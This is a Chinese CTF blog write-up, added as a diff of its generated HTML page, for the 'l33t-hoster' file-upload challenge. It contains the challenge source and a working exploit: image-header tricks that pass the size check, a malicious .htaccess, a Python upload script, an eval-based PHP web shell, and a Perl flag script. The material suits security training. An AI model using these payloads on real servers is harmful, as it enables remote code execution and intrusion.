@@ -1,0 +1,604 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>l33t-hoster - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="l33t-hoster">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-05-29 16:39" pubdate>
+        2020年5月29日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      729 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">l33t-hoster</h1>
+            
+            <div class="markdown-body">
+              <p>一眼望过去是一个上传题，很容易就发现<code>/?source</code>有源码</p>
+<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;source&quot;</span>])) 
+    <span class="hljs-keyword">die</span>(highlight_file(<span class="hljs-keyword">__FILE__</span>));
+
+session_start();
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;home&quot;</span>])) &#123;
+    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;home&quot;</span>] = bin2hex(random_bytes(<span class="hljs-number">20</span>));
+&#125;
+<span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;images/<span class="hljs-subst">&#123;$_SESSION[&quot;home&quot;]&#125;</span>/&quot;</span>;
+<span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$userdir</span>)) &#123;
+    mkdir(<span class="hljs-variable">$userdir</span>);
+&#125;
+
+<span class="hljs-variable">$disallowed_ext</span> = <span class="hljs-keyword">array</span>(
+    <span class="hljs-string">&quot;php&quot;</span>,
+    <span class="hljs-string">&quot;php3&quot;</span>,
+    <span class="hljs-string">&quot;php4&quot;</span>,
+    <span class="hljs-string">&quot;php5&quot;</span>,
+    <span class="hljs-string">&quot;php7&quot;</span>,
+    <span class="hljs-string">&quot;pht&quot;</span>,
+    <span class="hljs-string">&quot;phtm&quot;</span>,
+    <span class="hljs-string">&quot;phtml&quot;</span>,
+    <span class="hljs-string">&quot;phar&quot;</span>,
+    <span class="hljs-string">&quot;phps&quot;</span>,
+);
+
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;upload&quot;</span>])) &#123;
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;yuuuge fail&quot;</span>);
+    &#125;
+
+    <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;image&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];
+    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;image&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];
+    <span class="hljs-variable">$parts</span> = explode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$name</span>);
+    <span class="hljs-variable">$ext</span> = array_pop(<span class="hljs-variable">$parts</span>);
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$parts</span>[<span class="hljs-number">0</span>])) &#123;
+        array_shift(<span class="hljs-variable">$parts</span>);
+    &#125;
+
+    <span class="hljs-keyword">if</span> (count(<span class="hljs-variable">$parts</span>) === <span class="hljs-number">0</span>) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol filename is empty&quot;</span>);
+    &#125;
+
+    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$disallowed_ext</span>, <span class="hljs-literal">TRUE</span>)) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol nice try, but im not stupid dude...&quot;</span>);
+    &#125;
+
+    <span class="hljs-variable">$image</span> = file_get_contents(<span class="hljs-variable">$tmp_name</span>);
+    <span class="hljs-keyword">if</span> (mb_strpos(<span class="hljs-variable">$image</span>, <span class="hljs-string">&quot;&lt;?&quot;</span>) !== <span class="hljs-literal">FALSE</span>) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;why would you need php in a pic.....&quot;</span>);
+    &#125;
+
+    <span class="hljs-keyword">if</span> (!exif_imagetype(<span class="hljs-variable">$tmp_name</span>)) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not an image.&quot;</span>);
+    &#125;
+
+    <span class="hljs-variable">$image_size</span> = getimagesize(<span class="hljs-variable">$tmp_name</span>);
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$image_size</span>[<span class="hljs-number">0</span>] !== <span class="hljs-number">1337</span> || <span class="hljs-variable">$image_size</span>[<span class="hljs-number">1</span>] !== <span class="hljs-number">1337</span>) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol noob, your pic is not l33t enough&quot;</span>);
+    &#125;
+
+    <span class="hljs-variable">$name</span> = implode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$parts</span>);
+    move_uploaded_file(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$userdir</span> . <span class="hljs-variable">$name</span> . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$ext</span>);
+&#125;
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Your &lt;a href=<span class="hljs-subst">$userdir</span>&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;</span>;
+<span class="hljs-keyword">foreach</span>(glob(<span class="hljs-variable">$userdir</span> . <span class="hljs-string">&quot;*&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;li&gt;&lt;a href=&#x27;<span class="hljs-subst">$file</span>&#x27;&gt;<span class="hljs-subst">$file</span>&lt;/a&gt;&lt;/li&gt;&quot;</span>;
+&#125;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/ul&gt;&quot;</span>;
+
+<span class="hljs-meta">?&gt;</span>
+
+&lt;h1&gt;Upload your pics!&lt;/h1&gt;
+&lt;form method=<span class="hljs-string">&quot;POST&quot;</span> action=<span class="hljs-string">&quot;?&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;
+    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;image&quot;</span>&gt;
+    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=upload&gt;
+&lt;/form&gt;
+&lt;!-- /?source --&gt;
+
+<span class="hljs-number">1</span></code></pre>
+
+<p>设置了黑名单，其中最难绕的在这里</p>
+<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$image_size</span>[<span class="hljs-number">0</span>] !== <span class="hljs-number">1337</span> || <span class="hljs-variable">$image_size</span>[<span class="hljs-number">1</span>] !== <span class="hljs-number">1337</span>) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol noob, your pic is not l33t enough&quot;</span>);
+    &#125;</code></pre>
+
+<p>采用xbm格式绕过构造<code>.htaccess</code></p>
+<pre><code class="hljs stylus"><span class="hljs-number">#def</span>ine <span class="hljs-attribute">width</span> <span class="hljs-number">1337</span>
+<span class="hljs-number">#def</span>ine <span class="hljs-attribute">height</span> <span class="hljs-number">1337</span>
+
+AddType application/x-httpd-php .corb3nik
+php_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=shell.corb3nik</span></code></pre>
+
+<p>或则用<code>\x00\x00\x8a\x39\x8a\x39 开头来绕过</code></p>
+<pre><code class="hljs php">import requests
+import base64
+
+VALID_WBMP = <span class="hljs-string">b&quot;\x00\x00\x8a\x39\x8a\x39\x0a&quot;</span>
+URL = <span class="hljs-string">&quot;http://5890cd28-30e8-494e-9b48-471d8fb17678.node3.buuoj.cn/&quot;</span>
+RANDOM_DIRECTORY = <span class="hljs-string">&quot;952bb71de149c92301cc24a49edbb0c6810dfd39&quot;</span>
+
+COOKIES = &#123;
+    <span class="hljs-string">&quot;PHPSESSID&quot;</span> : <span class="hljs-string">&quot;nj32urf3id18f8vueuk988biv0&quot;</span>&#125;
+
+def upload_content(name, content):
+
+    data = &#123;
+        <span class="hljs-string">&quot;image&quot;</span> : (name, content, <span class="hljs-string">&#x27;image/png&#x27;</span>),
+        <span class="hljs-string">&quot;upload&quot;</span> : (None, <span class="hljs-string">&quot;Submit Query&quot;</span>, None)
+    &#125;
+
+    response = requests.post(URL, files=data, cookies=COOKIES)
+
+HT_ACCESS = VALID_WBMP + <span class="hljs-string">b&quot;&quot;</span><span class="hljs-string">&quot;</span>
+<span class="hljs-string">AddType application/x-httpd-php .corb3nik</span>
+<span class="hljs-string">php_value auto_append_file &quot;</span>php:<span class="hljs-comment">//filter/convert.base64-decode/resource=shell.corb3nik&quot;</span>
+<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span>
+<span class="hljs-string">TARGET_FILE = VALID_WBMP + b&quot;</span>AA<span class="hljs-string">&quot; + base64.b64encode(b&quot;</span><span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-meta">&lt;?php</span>
+  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;well&quot;</span>;
+  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;well&quot;</span>]);
+<span class="hljs-meta">?&gt;</span>
+<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;)</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">upload_content(&quot;</span>..htaccess<span class="hljs-string">&quot;, HT_ACCESS)</span>
+<span class="hljs-string">upload_content(&quot;</span>shell.corb3nik<span class="hljs-string">&quot;, TARGET_FILE)</span>
+<span class="hljs-string">upload_content(&quot;</span>trigger.corb3nik<span class="hljs-string">&quot;, VALID_WBMP)</span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string">response = requests.post(URL + &quot;</span>/images/<span class="hljs-string">&quot; + RANDOM_DIRECTORY + &quot;</span>/trigger.corb3nik<span class="hljs-string">&quot;)</span>
+<span class="hljs-string">print(response.text)</span></code></pre>
+
+<p>最后需要绕disable_function，蚁剑插件可以绕出来，再后面是计算加法得flag，抄了一个<code>perl </code>脚本</p>
+<pre><code class="hljs perl"><span class="hljs-comment">#define width 1337</span>
+<span class="hljs-comment">#define height 1337</span>
+<span class="hljs-comment">#!/usr/bin/env perl </span>
+<span class="hljs-keyword">use</span> warnings;
+<span class="hljs-keyword">use</span> strict;
+<span class="hljs-keyword">use</span> IPC::Open2;
+
+$| = <span class="hljs-number">1</span>;
+<span class="hljs-keyword">chdir</span> <span class="hljs-string">&quot;/&quot;</span>; <span class="hljs-comment">#!!!!!!!!!!!!!!!!!!!!!!!!!!</span>
+
+<span class="hljs-keyword">my</span> $pid = open2(\*out2, \*in2, <span class="hljs-string">&#x27;./get_flag&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;
+
+<span class="hljs-keyword">my</span> $reply = &lt;out2&gt;;
+<span class="hljs-keyword">print</span> STDOUT $reply; <span class="hljs-comment">#string: solve captcha..</span>
+$reply = &lt;out2&gt;;
+<span class="hljs-keyword">print</span> STDOUT $reply; <span class="hljs-comment">#captcha formula</span>
+
+<span class="hljs-keyword">my</span> $answer = <span class="hljs-keyword">eval</span>($reply);
+<span class="hljs-keyword">print</span> STDOUT <span class="hljs-string">&quot;answer: $answer\n&quot;</span>; 
+
+<span class="hljs-keyword">print</span> in2 <span class="hljs-string">&quot; $answer &quot;</span>; <span class="hljs-comment">#send it to process</span>
+in2-&gt;flush();
+
+$reply = &lt;out2&gt;;
+<span class="hljs-keyword">print</span> STDOUT $reply; <span class="hljs-comment">#flag :D</span></code></pre>
+
+<p>上传执行就可以得到flag</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/06/01/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[网鼎杯 2020 玄武组]SSRFMe</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/29/%E5%86%85%E7%BD%91/">
+                        <span class="hidden-mobile">内网</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
